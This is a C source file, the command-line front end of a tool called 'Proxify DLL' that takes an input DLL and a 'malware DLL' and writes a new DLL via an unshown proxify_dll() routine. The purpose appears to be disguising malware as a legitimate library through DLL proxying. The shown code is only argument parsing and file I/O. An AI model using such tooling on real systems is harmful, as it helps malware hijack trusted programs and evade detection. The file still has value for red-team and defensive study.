//
//
//   `7MM"""Mq.`7MM"""Mq.   .g8""8q.`YMM'   `MP' `7MMF'`7MM"""YMM `YMM'   `MM'    `7MM"""Yb. `7MMF'      `7MMF'
//     MM   `MM. MM   `MM..dP'    `YM.VMb.  ,P     MM    MM    `7   VMA   ,V        MM    `Yb. MM          MM
//     MM   ,M9  MM   ,M9 dM'      `MM `MM.M'      MM    MM   d      VMA ,V         MM     `Mb MM          MM
//     MMmmdM9   MMmmdM9  MM        MM   MMb       MM    MM""MM       VMMP          MM      MM MM          MM
//     MM        MM  YM.  MM.      ,MP ,M'`Mb.     MM    MM   Y        MM           MM     ,MP MM      ,   MM      ,
//     MM        MM   `Mb.`Mb.    ,dP',P   `MM.    MM    MM            MM           MM    ,dP' MM     ,M   MM     ,M
//   .JMML.    .JMML. .JMM. `"bmmd"'.MM:.  .:MMa..JMML..JMML.        .JMML.       .JMMmmmdP' .JMMmmmmMMM .JMMmmmmMMM
//
//
// (c) jmgk 2022

#include <ctype.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "pdl.h"

#define MAP_SIZE (16 * 1024 * 1024)

//
//
//   `7MM"""YMM `7MMF'`7MMF'      `7MM"""YMM      `7MMM.     ,MMF'      db      `7MM"""Mq.
//     MM    `7   MM    MM          MM    `7        MMMb    dPMM       ;MM:       MM   `MM.
//     MM   d     MM    MM          MM   d          M YM   ,M MM      ,V^MM.      MM   ,M9
//     MM""MM     MM    MM          MMmmMM          M  Mb  M' MM     ,M  `MM      MMmmdM9
//     MM   Y     MM    MM      ,   MM   Y  ,       M  YM.P'  MM     AbmmmqMA     MM
//     MM         MM    MM     ,M   MM     ,M       M  `YM'   MM    A'     VML    MM
//   .JMML.     .JMML..JMMmmmmMMM .JMMmmmmMMM     .JML. `'  .JMML..AMA.   .AMMA..JMML.
//
//

void *create_file_memory_map(char *file, int add_size) {
  FILE *fp1;
  if ((fp1 = fopen(file, "rb")) != NULL) {
    fseek(fp1, 0, SEEK_END);
    int size = ftell(fp1);
    void *ptr = malloc(size + add_size);
    if (ptr == NULL) {
      printf("error in map malloc()\n");
      fclose(fp1);
      return NULL;
    }
    fseek(fp1, 0, SEEK_SET);
    fread(ptr, 1, size, fp1);
    fclose(fp1);
    return ptr;
  } else {
    printf("error in map fopen()\n");
    return NULL;
  }
}

void discart_file_memory_map(void *ptr) { free(ptr); }

void write_file_memory_map(char *file, void *ptr, int size) {
  FILE *fp1;
  if ((fp1 = fopen(file, "wb")) != NULL) {
    fwrite(ptr, 1, size, fp1);
    fclose(fp1);
  } else {
    printf("error in map fopen(wb)\n");
  }
  free(ptr);
}

//
//
//   `7MMM.     ,MMF'      db      `7MMF'`7MN.   `7MF'
//     MMMb    dPMM       ;MM:       MM    MMN.    M
//     M YM   ,M MM      ,V^MM.      MM    M YMb   M
//     M  Mb  M' MM     ,M  `MM      MM    M  `MN. M
//     M  YM.P'  MM     AbmmmqMA     MM    M   `MM.M
//     M  `YM'   MM    A'     VML    MM    M     YMM
//   .JML. `'  .JMML..AMA.   .AMMA..JMML..JML.    YM
//
//

int main(int argc, char **argv) {
  printf("Proxify DLL\nJMGK (c) 2022\n");

  bool debug = false;
  char *input = NULL;
  char *output = NULL;
  char *malware = NULL;

  // parse command-line
  int c;
  while ((c = getopt(argc, argv, "vi:o:m:")) != -1)
    switch (c) {
    case 'v':
      debug = true;
      break;
    case 'i':
      input = optarg;
      break;
    case 'o':
      output = optarg;
      break;
    case 'm':
      malware = optarg;
      break;
    }

  // check command-line
  if ((input == NULL) || (output == NULL) || (malware == NULL)) {
    printf("Usage: %s [-i input_dll] [-o output_dll] [-m malware_dll]\n",
           argv[0]);
    exit(EXIT_FAILURE);
  }

  // info
  if (debug) {
    printf("* INPUT DLL: %s\n", input);
    printf("* OUTPUT DLL: %s\n", output);
    printf("* MALWARE DLL: %s\n", malware);
  }

  // check provided files
  if (access(input, F_OK) != 0) {
    printf("error input_dll dont exists\n");
    exit(EXIT_FAILURE);
  }
  if (access(output, F_OK) == 0) {
    printf("error output_dll already exists\n");
    exit(EXIT_FAILURE);
  }
  if (access(malware, F_OK) != 0) {
    printf("error malware_dll dont exists\n");
    exit(EXIT_FAILURE);
  }

  // map files
  void *input_ptr;
  if ((input_ptr = create_file_memory_map(input, 0)) == NULL) {
    printf("error mapping input_dll\n");
    exit(EXIT_FAILURE);
  }
  void *malware_ptr;
  if ((malware_ptr = create_file_memory_map(malware, MAP_SIZE)) == NULL) {
    printf("error mapping malware_dll\n");
    exit(EXIT_FAILURE);
  }

  // process
  int new_malware_size =
      proxify_dll(malware_ptr, input_ptr, (debug ? PDL_FLAG_DEBUG : 0));

  //check success
  if (new_malware_size == 0) {
    printf("error proxyfing dll\n");
    exit(EXIT_FAILURE);
  }

  // close maps
  discart_file_memory_map(input_ptr);
  write_file_memory_map(output, malware_ptr, new_malware_size);

  printf("success!\n");
  exit(EXIT_SUCCESS);
}
